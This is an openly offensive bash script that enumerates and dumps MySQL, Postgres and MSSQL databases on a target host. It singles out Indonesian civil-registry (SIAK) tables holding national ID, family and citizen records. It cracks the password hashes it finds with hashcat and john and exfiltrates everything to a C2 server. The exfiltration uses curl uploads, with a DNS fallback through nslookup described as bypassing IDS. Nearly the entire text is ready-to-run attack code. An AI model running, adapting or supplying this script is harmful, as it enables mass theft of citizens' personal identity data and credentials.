set -euo pipefail

# Config
TARGET_HOST="${1:?Error: Provide target host}"
DB_USER="${2:-admin}"
DB_PASS="${3:-}"
OUTPUT_DIR="loot_$(date +%Y%m%d_%H%M%S)"
C2_URL="http://YOUR_C2:8080/upload"  # Ganti dengan C2 kamu

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

mkdir -p "$OUTPUT_DIR" "$OUTPUT_DIR/dumps" "$OUTPUT_DIR/hashes"
cd "$OUTPUT_DIR"

info_banner() {
    cat << 'EOF'
    ╔══════════════════════════════════════╗
    ║         Database Exfiltration        ║
    ║   Multi-DBMS | Stealth | Production  ║
    ╚══════════════════════════════════════╝
EOF
}

check_prereqs() {
    local tools=(mysql mssql-cli psql sqlite3 hashcat john)
    local missing=()
    
    for tool in "${tools[@]}"; do
        command -v "$tool" &>/dev/null || missing+=("$tool")
    done
    
    [ ${#missing[@]} -eq 0 ] || {
        echo -e "${RED}[-] Install: ${missing[*]}${NC}"
        echo "apt install -y mysql-client mssql-tools-default postgresql-client sqlite3 hashcat john"
        exit 1
    }
}

db_enum() {
    local dbms=$1
    echo -e "${BLUE}[*]${NC} Enumerating $dbms databases..."
    
    case $dbms in
        mysql)
            mysql -h"$TARGET_HOST" -u"$DB_USER" -p"$DB_PASS" -e "
                SHOW DATABASES;
                SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();
                SELECT column_name,data_type FROM information_schema.columns WHERE table_schema=DATABASE() LIMIT 10;
            " 2>/dev/null | tee "db_enum_$dbms.txt" || return 1
            ;;
        postgres)
            PGPASSWORD="$DB_PASS" psql -h"$TARGET_HOST" -U"$DB_USER" -d postgres -c "
                \l;
                \dt;
                SELECT table_name,column_name,data_type FROM information_schema.columns LIMIT 10;
            " 2>/dev/null | tee "db_enum_postgres.txt" || return 1
            ;;
        mssql)
            mssql-cli -S "$TARGET_HOST" -U"$DB_USER" -P"$DB_PASS" -Q "
                SELECT name FROM sys.databases;
                SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
            " 2>/dev/null | tee "db_enum_mssql.txt" || return 1
            ;;
    esac
}

dump_database() {
    local dbms=$1 db_name=$2
    echo -e "${GREEN}[+]${NC} Dumping $dbms.$db_name..."
    
    case $dbms in
        mysql)
            TABLES=$(mysql -h"$TARGET_HOST" -u"$DB_USER" -p"$DB_PASS" -N -e "
                SELECT TABLE_NAME FROM information_schema.tables 
                WHERE table_schema='$db_name' AND table_rows>0;
            " 2>/dev/null)
            
            for table in $TABLES; do
                echo "  Dumping $table..."
                mysql -h"$TARGET_HOST" -u"$DB_USER" -p"$DB_PASS" "$db_name" \
                    -e "SELECT * FROM $table LIMIT 10000;" > "dumps/${db_name}_${table}.csv" 2>/dev/null &
            done
            wait
            ;;
        postgres)
            PGPASSWORD="$DB_PASS" pg_dump -h"$TARGET_HOST" -U"$DB_USER" \
                -t penduduk -t nik -t ktp -t keluarga "$db_name" > "dumps/${db_name}.sql" || \
            PGPASSWORD="$DB_PASS" psql -h"$TARGET_HOST" -U"$DB_USER" "$db_name" \
                -c "COPY (SELECT * FROM penduduk LIMIT 10000) TO STDOUT CSV;" > "dumps/${db_name}_penduduk.csv"
            ;;
        sqlite)
            sqlite3 "/path/to/siak.db" ".dump" > "dumps/siak.db.sql" 2>/dev/null
            sqlite3 "/path/to/siak.db" "SELECT * FROM penduduk;" > "dumps/penduduk.csv"
            ;;
    esac
}

hash_cracking() {
    echo -e "${BLUE}[*]${NC} Cracking hashes..."
    # Extract hashes from dumps
    grep -rEi "(md5|sha1|hash|password|bcrypt)" dumps/ 2>/dev/null | \
    while read -r line; do
        echo "$line" >> hashes.txt
    done
    
    # Auto-crack
    [ -s "hashes.txt" ] && {
        hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --potfile-disable &
        john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt &
    }
}

stealth_exfil() {
    echo -e "${YELLOW}[*]${NC} Stealth exfiltration..."
    
    # Compress intelligently
    find dumps/ -type f -size +1M -exec gzip {} \; 2>/dev/null
    
    # Split large files
    find . -type f -size +10M -exec sh -c '
        for file; do
            split -b 5M "$file" "$file.part."
            rm "$file"
        done
    ' _ {} +
    
    # Multi-protocol exfil (bypass IDS)
    for file in $(find . -type f ! -name "*.part.*" -o -name "*.part.*"); do
        if [[ "$C2_URL" =~ ^https? ]]; then
            curl -s -T "$file" "$C2_URL/$(basename "$file")" --max-time 30 || {
                # Fallback DNS exfil
                echo -e "${RED}[-]${NC} HTTP failed, trying DNS..."
                nslookup "$(basename "$file").$(base64 -w0 < "$file")".exfil.your-c2.com 2>/dev/null
            }
        fi
        sleep 0.5  # Rate limiting
    done
}

siak_specific_loot() {
    echo -e "${BLUE}[*]${NC} Siak-specific loot..."
    # Common Siak tables
    SIAC_TABLES="penduduk nik ktp keluarga users admin pegawai"
    
    for table in $SIAC_TABLES; do
        mysql -h"$TARGET_HOST" -u"$DB_USER" -p"$DB_PASS" -N -e "
            SELECT * FROM $table LIMIT 5000;
        " > "dumps/siak_${table}.csv" 2>/dev/null || continue
        echo -e "${GREEN}[+]${NC} $table: $(wc -l < "dumps/siak_${table}.csv") records"
    done
}

main() {
    info_banner
    check_prereqs
    
    echo -e "${GREEN}[+]${NC} Target: $TARGET_HOST | User: $DB_USER"
    echo -e "${BLUE}[*]${NC} Output: $OUTPUT_DIR/"
    
    # Auto-detect DBMS
    for dbms in mysql postgres mssql; do
        if db_enum "$dbms"; then
            echo -e "${GREEN}[+]${NC} $dbms ACCESS CONFIRMED!"
            dump_database "$dbms" "siak_db"  # Default Siak DB
            siak_specific_loot
            break
        fi
    done
    
    hash_cracking
    stealth_exfil
    
    # Final report
    {
        echo "=== BIJI EXFIL REPORT ==="
        echo "Target: $TARGET_HOST"
        echo "Files: $(find . -type f | wc -l)"
        echo "Size: $(du -sh . | cut -f1)"
        echo "Hashes cracked: $([ -f ~/.local/share/hashcat/hashcat.potfile ] && wc -l ~/.local/share/hashcat/hashcat.potfile || echo 0)"
    } > REPORT.txt
    
    echo -e "${GREEN}[+]${NC} ${YELLOW}COMPLETE!${NC} $(du -sh . | cut -f1) exfiltrated"
    echo -e "${GREEN}[+]${NC} Report: $OUTPUT_DIR/REPORT.txt"
}

main "$@"